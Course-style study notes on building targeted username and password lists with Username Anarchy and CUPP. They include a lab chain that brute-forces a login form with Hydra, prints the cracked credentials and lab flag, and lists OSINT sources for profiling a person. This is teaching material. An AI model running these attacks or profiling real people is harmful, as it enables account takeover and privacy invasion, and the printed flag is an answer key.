# Section 11 — Custom Wordlists

---

## Why Custom Wordlists?

Generic lists like rockyou.txt are wide but inefficient for a specific person. Custom wordlists built from OSINT (Open Source Intelligence — publicly available information) on the target narrow the search dramatically and increase the hit rate.

**Two tools for this:**
- **Username Anarchy** — generates username variations from a real name
- **CUPP** (Common User Passwords Profiler) — generates personalized password lists from OSINT profile data

---

## Username Anarchy

Generates every common username format from a first/last name.

### Install
```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```
> Clones the Username Anarchy repository. Run this once to install it; the tool requires no compilation.

### Generate usernames
```bash
./username-anarchy Jane Smith > jane_smith_usernames.txt
```
> Generates all common username formats for the given first and last name and saves them to a file. Replace `Jane Smith` with your target's real name.

**What it produces** (14 variations for Jane Smith):
```
jane, janesmith, jane.smith, j.smith, janes, smithjane, smith, 
smithj, smith.j, smith.jane, JSmith, jane1, js, Jane.Smith ...
```

**When to use:** Any time you know the target's real name and need to guess their login username — corporate portals, Active Directory (AD) accounts, web apps.

---

## CUPP — Common User Passwords Profiler

Builds a personalized password list from OSINT about the target.

### Install
```bash
git clone https://github.com/Mebus/cupp.git
# or: sudo apt install cupp -y
```
> Installs CUPP (Common User Passwords Profiler) via git or apt. Either method works; the apt version may lag behind the latest release.

### Run interactively
```bash
python3 cupp/cupp.py -i
```
> Starts CUPP in interactive mode. It prompts for profile details (name, birthdate, pet, company, etc.) and generates a personalized password list. The output file is named after the target's first name.

Give CUPP everything you found during recon. The more detail you provide, the better the resulting password list.

**Example profile (Jane Smith):**
| Field | Value |
|-------|-------|
| First Name | Jane |
| Surname | Smith |
| Nickname | Janey |
| Birthdate | 11121990 |
| Partner | Jim (Jimbo) |
| Partner DOB | 12121990 |
| Pet | Spot |
| Company | AHI |
| Keywords | hacker, blue |
| Special chars | Yes |
| Random numbers | Yes |
| Leet mode | Yes |

**Output:** `jane.txt` — ~48,000 password variations including:
- `Jane`, `jane`, `enaj` (reversed)
- `jane1990`, `smith1112`, `Janey!`
- `j4n3`, `5p0t`, `J@n3y!!`
- Combinations with partner, pet, company, keywords

---

## Filtering to Match a Password Policy

After CUPP generates the list, filter it down to only passwords that comply with the target's policy — massively reduces attack time.

**Example policy:** Min 6 chars, uppercase, lowercase, number, 2+ special chars from `!@#$%^&*`

```bash
grep -E '^.{6,}$' jane.txt \
  | grep -E '[A-Z]' \
  | grep -E '[a-z]' \
  | grep -E '[0-9]' \
  | grep -E '([!@#$%^&*].*){2,}' \
  > jane-filtered.txt
```
> Filters the CUPP output to only passwords that match the target's policy. Each `grep` stage removes candidates that fail one rule. Adjust the regex filters to match whatever policy you have (change the special char set, min length, or add/remove filters).

| Filter | Regex | Purpose |
|--------|-------|---------|
| Min length | `^.{6,}$` | At least 6 characters |
| Uppercase | `[A-Z]` | At least one uppercase |
| Lowercase | `[a-z]` | At least one lowercase |
| Number | `[0-9]` | At least one digit |
| 2+ special chars | `([!@#$%^&*].*){2,}` | Two or more special chars from allowed set |

**Result:** ~48,000 → ~7,900 candidates.

---

## Lab — Custom Wordlist Attack

**Objective:** Build targeted username and password lists from OSINT on "Jane Smith," filter to policy, brute-force the login form.

**Why custom lists work here:** Generic lists won't have `3n4J!!` in them. That is a leet-speak plus special-character mutation of Jane's name that CUPP generates. Only a targeted list finds it.

---

### Full Command Chain

```bash
# 1. Generate usernames
./username-anarchy Jane Smith > jane_smith_usernames.txt

# 2. Generate passwords with CUPP (pipe answers in non-interactively)
printf "Jane\nSmith\nJaney\n11121990\nJim\nJimbo\n12121990\n\n\n\nSpot\nAHI\ny\nhacker,blue\ny\ny\ny\nn\n" \
  | python3 cupp/cupp.py -i

# 3. Filter to policy
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' \
  | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt

# 4. Brute force with Hydra
hydra -L jane_smith_usernames.txt -P jane-filtered.txt TARGET_IP \
  -s TARGET_PORT -f -t 64 \
  http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

# 5. Log in and get the flag
curl -s -X POST http://TARGET_IP:TARGET_PORT/ \
  -d "username=jane&password=3n4J!!" -c /tmp/cookies.txt
curl -s -b /tmp/cookies.txt http://TARGET_IP:TARGET_PORT/success
```
> Full five-step chain: generate username variations, build a personalized password list non-interactively via `printf`, filter to policy, brute-force the login form with Hydra, then retrieve the flag with curl. Replace names, IP, port, and credentials throughout.

**Credentials found:** `jane : 3n4J!!`

**Result:**
```
HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}
```

**Q1 Answer:** `HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}`

---

## OSINT Sources for CUPP

| Source | What to look for |
|--------|-----------------|
| Social media (Facebook, Instagram) | Birthdate, pet names, hobbies, partner names, favorite quotes |
| LinkedIn | Company name, job title, industry keywords |
| Company website | Department, colleagues, email format |
| Public records | Address, family members |
| News/blogs | Affiliations, achievements, interests |

---

## Exam Notes

- Always build custom lists when you have a target name — generic lists won't find mutation-based passwords
- Filter CUPP output to the target's password policy before running — cuts runtime by 80–90%
- `([!@#$%^&*].*){2,}` requires the special chars to appear at least twice (greedy match) — adjust the set to match the allowed chars in the policy
- Username Anarchy + CUPP is the standard combo for targeted individual accounts
- CUPP non-interactive tip: pipe answers with `printf` to avoid the interactive prompt in scripts
